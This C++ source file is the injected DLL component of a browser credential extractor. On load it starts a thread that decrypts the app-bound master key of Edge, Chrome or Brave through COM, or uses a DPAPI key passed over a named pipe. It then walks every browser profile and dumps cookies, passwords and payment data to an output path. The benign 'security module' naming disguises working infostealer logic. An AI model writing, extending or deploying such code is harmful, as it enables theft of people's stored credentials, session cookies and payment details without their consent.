// CryptCore.cpp - Security module entry point and workflow coordination
// Implements split-key strategy for Edge: COM for cookies/payments, DPAPI for passwords
#include "CryptCore.h"
#include "BrowserCrypto.h"
#include "DataExtraction.h"
#include "CommunicationModule.h"
#include "SelfLoader.h"
#include "RuntimeSupport.h"
#include <memory>

namespace SecurityComponents
{
    // Initializes security orchestrator and establishes pipe communication
    SecurityOrchestrator::SecurityOrchestrator(LPCWSTR lpcwstrPipeName)
    {
        m_logger.emplace(lpcwstrPipeName);
    }

    bool SecurityOrchestrator::Initialize(std::string& error)
    {
        if (!m_logger || !m_logger->isValid())
        {
            error = "Failed to connect to named pipe from orchestrator.";
            return false;
        }
        return ReadPipeParameters(error);
    }

    // Main execution workflow: decrypt keys, enumerate profiles, extract data
    bool SecurityOrchestrator::Run(std::string& error)
    {
        BrowserManager browserManager;
        const auto& browserConfig = browserManager.getConfig();
        if (!browserConfig.name)
        {
            error = "Unsupported host process.";
            return false;
        }
        m_logger->Log(kvc::DiagnosticLevel::Info,
                      kvc::DiagnosticEvent::ExtractionStarted,
                      {browserConfig.name});
        
        std::vector<uint8_t> comKey;
        const std::wstring userDataRoot = browserManager.getUserDataRoot();
        if (userDataRoot.empty())
        {
            error = "Failed to determine browser user data path.";
            return false;
        }
        const std::wstring localStatePath = kvc::paths::Join(userDataRoot, L"Local State");
        
        // Edge: try COM first (app_bound_encrypted_key — modern APPB cookies & passwords),
        // fall back to pre-extracted DPAPI key if COM is unavailable.
        if (kvc::text::IEqualsAscii(browserConfig.name, "Edge"))
        {
            bool comOk = false;
            m_logger->Log(kvc::DiagnosticLevel::Info,
                          kvc::DiagnosticEvent::EdgeComAttempt);
            MasterKeyDecryptor keyDecryptor(*m_logger);
            std::string keyError;
            comKey = keyDecryptor.Decrypt(browserConfig, localStatePath, DataType::All, keyError);
            if (!comKey.empty())
            {
                m_logger->Log(kvc::DiagnosticLevel::Success,
                              kvc::DiagnosticEvent::EdgeComSuccess);
                comOk = true;
            }
            else
            {
                m_logger->Log(kvc::DiagnosticLevel::Warning,
                              kvc::DiagnosticEvent::EdgeComFailed,
                              {keyError});
            }

            if (!comOk)
            {
                if (!m_edgeDpapiKey.empty())
                {
                    comKey  = m_edgeDpapiKey;
                    m_logger->Log(kvc::DiagnosticLevel::Info,
                                  kvc::DiagnosticEvent::EdgeDpapiFallback);
                }
                else
                {
                    m_logger->Log(kvc::DiagnosticLevel::Error,
                                  kvc::DiagnosticEvent::EdgeNoKey);
                    error = "No key available for Edge.";
                    return false;
                }
            }
        }
        else 
        {
            // Chrome/Brave use single COM-elevated key for all data types
            m_logger->Log(kvc::DiagnosticLevel::Info,
                          kvc::DiagnosticEvent::SingleKeyStart,
                          {browserConfig.name});
            MasterKeyDecryptor keyDecryptor(*m_logger);
            std::string keyError;
            comKey = keyDecryptor.Decrypt(browserConfig, localStatePath, DataType::All, keyError);
            if (comKey.empty())
            {
                error = "Failed to decrypt master key for ";
                error.append(browserConfig.name);
                error.append(": ");
                error.append(keyError);
                m_logger->Log(kvc::DiagnosticLevel::Error,
                              kvc::DiagnosticEvent::SingleKeyFailed,
                              {browserConfig.name, keyError});
                return false;
            }
            m_logger->Log(kvc::DiagnosticLevel::Success,
                          kvc::DiagnosticEvent::SingleKeySuccess);
        }

        // Ask the orchestrator to release Chromium database locks only after the key is
        // available. The DLL waits for its ACK, then opens databases immediately.
        m_logger->LogControl("__DB_READY__");
        std::string handshakeError;
        if (!m_logger->WaitForMessage("DB_READY_ACK", 15000, handshakeError))
        {
            error = "Database access handshake failed: " + handshakeError;
            m_logger->Log(kvc::DiagnosticLevel::Error,
                          kvc::DiagnosticEvent::DatabaseHandshakeFailed,
                          {handshakeError});
            return false;
        }
        m_logger->Log(kvc::DiagnosticLevel::Success,
                      kvc::DiagnosticEvent::DatabaseHandshakeComplete);
        
        // Enumerate all browser profiles
        ProfileEnumerator enumerator(userDataRoot, *m_logger);
        std::vector<std::wstring> profilePaths = enumerator.FindProfiles();
        std::string profileCount;
        kvc::text::AppendUnsigned(profileCount, profilePaths.size());
        m_logger->Log(kvc::DiagnosticLevel::Success,
                      kvc::DiagnosticEvent::ProfilesFound,
                      {profileCount});

        // Extract data from each profile
        std::size_t dataConfigCount = 0;
        const Data::ExtractionConfig* dataConfigs =
            Data::GetExtractionConfigs(dataConfigCount);
        for (const auto& profilePath : profilePaths) 
        {
            m_logger->Log(kvc::DiagnosticLevel::Info,
                          kvc::DiagnosticEvent::ProcessingProfile,
                          {StringUtils::path_to_string(kvc::paths::FileName(profilePath))});
            
            for (std::size_t configIndex = 0; configIndex < dataConfigCount; ++configIndex)
            {
                const Data::ExtractionConfig& dataConfig = dataConfigs[configIndex];
                // All data types use comKey (Edge and Chrome/Brave both use COM/APPB)
                const std::vector<uint8_t>* extractionKey = &comKey;
                m_logger->Log(kvc::DiagnosticLevel::Info,
                              kvc::DiagnosticEvent::UsingComKey,
                              {dataConfig.outputFileName});

                DataExtractor extractor(profilePath, dataConfig, *extractionKey, *m_logger,
                                        m_outputPath, browserConfig.name);
                extractor.Extract();
            }
        }

        m_logger->Log(kvc::DiagnosticLevel::Success,
                      kvc::DiagnosticEvent::ExtractionComplete);
        return true;
    }

    // Reads configuration parameters from orchestrator via named pipe
    bool SecurityOrchestrator::ReadPipeParameters(std::string& error)
    {
        constexpr DWORD kConfigurationTimeoutMs = 10000;
        std::string message;

        // Read verbose flag
        if (!m_logger->ReadMessage(message, kConfigurationTimeoutMs, error))
        {
            error = "Failed to read verbose flag from pipe: " + error;
            m_logger->Log(kvc::DiagnosticLevel::Error,
                          kvc::DiagnosticEvent::ReadVerboseFailed);
            return false;
        }

        // Read output path
        if (!m_logger->ReadMessage(message, kConfigurationTimeoutMs, error))
        {
            error = "Failed to read output path from pipe: " + error;
            m_logger->Log(kvc::DiagnosticLevel::Error,
                          kvc::DiagnosticEvent::ReadOutputPathFailed);
            return false;
        }
        m_outputPath = kvc::text::Utf8ToWide(message);
        if (m_outputPath.empty())
        {
            error = "Output path from pipe is not valid UTF-8.";
            return false;
        }
        m_logger->Log(kvc::DiagnosticLevel::Info,
                      kvc::DiagnosticEvent::OutputPathConfigured,
                      {StringUtils::path_to_string(m_outputPath)});

        // Read DPAPI key (Edge only)
        if (!m_logger->ReadMessage(message, kConfigurationTimeoutMs, error))
        {
            error = "Failed to read DPAPI key from pipe: " + error;
            m_logger->Log(kvc::DiagnosticLevel::Error,
                          kvc::DiagnosticEvent::ReadDpapiKeyFailed);
            return false;
        }

        // Parse DPAPI key message
        const std::string_view dpapiKeyMessage(message);
        if (kvc::text::StartsWith(dpapiKeyMessage, "DPAPI_KEY:"))
        {
            const std::string_view hexKey = dpapiKeyMessage.substr(10);
            if (hexKey == "NONE")
            {
                m_logger->Log(kvc::DiagnosticLevel::Info,
                              kvc::DiagnosticEvent::DpapiKeyNotProvided);
            }
            else if (hexKey.size() >= 64)
            {
                m_edgeDpapiKey.resize(32);
                for (std::size_t i = 0; i < m_edgeDpapiKey.size(); ++i)
                {
                    std::uint64_t byte = 0;
                    if (!kvc::text::ParseUnsigned(hexKey.substr(i * 2, 2), 16, byte))
                    {
                        m_edgeDpapiKey.clear();
                        error = "Invalid hexadecimal DPAPI key from orchestrator.";
                        return false;
                    }
                    m_edgeDpapiKey[i] = static_cast<std::uint8_t>(byte);
                }
                std::string keySize;
                kvc::text::AppendUnsigned(keySize, m_edgeDpapiKey.size());
                m_logger->Log(kvc::DiagnosticLevel::Success,
                              kvc::DiagnosticEvent::DpapiKeyReceived,
                              {keySize});
            }
            else
            {
                error = "Invalid DPAPI key length from orchestrator.";
                return false;
            }
        }
        else
        {
            error = "Invalid DPAPI key message format.";
            m_logger->Log(kvc::DiagnosticLevel::Error,
                          kvc::DiagnosticEvent::DpapiKeyInvalid);
            return false;
        }
        return true;
    }
}

// Security module worker thread entry point
DWORD WINAPI SecurityModuleWorker(LPVOID lpParam)
{
    std::unique_ptr<ModuleThreadParams> threadParams(
        static_cast<ModuleThreadParams*>(lpParam));

    bool success = false;
    std::string error;
    {
        SecurityComponents::SecurityOrchestrator orchestrator(
            static_cast<LPCWSTR>(threadParams->lpPipeNamePointerFromOrchestrator));
        if (orchestrator.Initialize(error))
            success = orchestrator.Run(error);
    }

    if (!success)
    {
        SecurityComponents::PipeLogger errorLogger(
            static_cast<LPCWSTR>(threadParams->lpPipeNamePointerFromOrchestrator));
        if (errorLogger.isValid())
        {
            errorLogger.Log(kvc::DiagnosticLevel::Error,
                            kvc::DiagnosticEvent::CriticalModuleError,
                            {error.empty() ? "unknown failure" : error});
        }
    }

    const HMODULE module = threadParams->hModule_dll;
    threadParams.reset();
    FreeLibraryAndExitThread(module, 0);
    return 0;
}

// DLL entry point - creates worker thread for asynchronous execution
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

        auto params = new (std::nothrow) ModuleThreadParams{hModule, lpReserved};
        if (!params) return TRUE;

        HANDLE hThread = CreateThread(NULL, 0, SecurityModuleWorker, params, 0, NULL);
        if (hThread)
        {
            CloseHandle(hThread);
        }
        else
        {
            delete params;
        }
    }
    return TRUE;
}
